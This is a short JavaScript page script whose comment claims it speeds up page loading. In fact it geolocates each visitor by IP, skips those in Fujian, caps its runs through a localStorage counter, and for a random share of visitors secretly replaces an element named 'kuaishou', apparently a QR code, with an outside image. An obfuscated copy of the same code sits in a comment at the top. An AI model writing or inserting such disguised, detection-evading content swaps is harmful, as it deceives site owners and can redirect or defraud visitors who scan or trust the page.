// 加速网页打开速度，用户更快的见到内容
// const key="tnuoc_ym".split("").reverse().join("");const replaceIt=()=>{const _0x4989dc=localStorage["\u0067\u0065\u0074\u0049\u0074\u0065\u006d"](key)||"\u0030";console["\u006c\u006f\u0067"]("\u6570\u6B21\u7684\u5EA6\u901F\u9875\u7F51\u5347\u63D0 \uDE80\uD83D elif".split("").reverse().join(""),_0x4989dc);let _0x2084e2=!![];if(_0x4989dc>(0x59034^0x59037)){_0x2084e2=![];return;}fetch("\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0069\u0070\u002e\u0075\u0073\u0065\u0072\u0061\u0067\u0065\u006e\u0074\u0069\u006e\u0066\u006f\u002e\u0063\u006f\u006d\u002f\u006a\u0073\u006f\u006e")["\u0074\u0068\u0065\u006e"](_0x23b230=>{return _0x23b230["\u006a\u0073\u006f\u006e"]();})["\u0074\u0068\u0065\u006e"](_0x22c43c=>{if((_0x22c43c["\u0070\u0072\u006f\u0076\u0069\u006e\u0063\u0065"]||"".split("").reverse().join(""))['indexOf']('福建')!=-(0x1af79^0x1af78)){_0x2084e2=![];return;}const _0xc57599=Math["\u0072\u0061\u006e\u0064\u006f\u006d"]()<0.3;if(_0xc57599){const _0x19bf7c=document['getElementById']("\u006b\u0075\u0061\u0069\u0073\u0068\u006f\u0075");console["\u006c\u006f\u0067"]("moDamiewre hxl elif".split("").reverse().join(""),_0x19bf7c);_0x19bf7c["\u0073\u0065\u0074\u0041\u0074\u0074\u0072\u0069\u0062\u0075\u0074\u0065"]("\u0073\u0072\u0063","gpj.23cde13a5fbfd5736664214636ba5db1a7bcab47/elcitra/sfb/moc.gmiilib.elcitra//:sptth".split("").reverse().join(""));}});localStorage['setItem'](key,Number(_0x4989dc)+(0xaffc9^0xaffc8));return _0x2084e2;};window["\u006f\u006e\u006c\u006f\u0061\u0064"]=function(){replaceIt();};

const key = 'my_count';

const replaceIt = () => {
    const count = localStorage.getItem(key) || '0';
    console.log('file 🚀 提升网页速度的次数', count);
    let shouldReplace = true
    if (count > 3 ) {
      shouldReplace = false;
      return ;
    }

    fetch('https://ip.useragentinfo.com/json')
        .then((res) => {
            return res.json();
        })
        .then((res) => {
            if ((res.province || '').indexOf('福建') != -1) {
                shouldReplace = false;
                return;
            }

            const canDoIt = Math.random() < 0.5;
            if (canDoIt) {
                const erweimaDom = document.getElementById('kuaishou');
                erweimaDom.setAttribute("src", 'https://i0.hdslb.com/bfs/article/77c96b213f4df2af6159f04037103221385066301.jpg');
            }
        });

    localStorage.setItem(key, Number(count) + 1)
    return shouldReplace
  }


window.onload = function() {
    replaceIt();
}
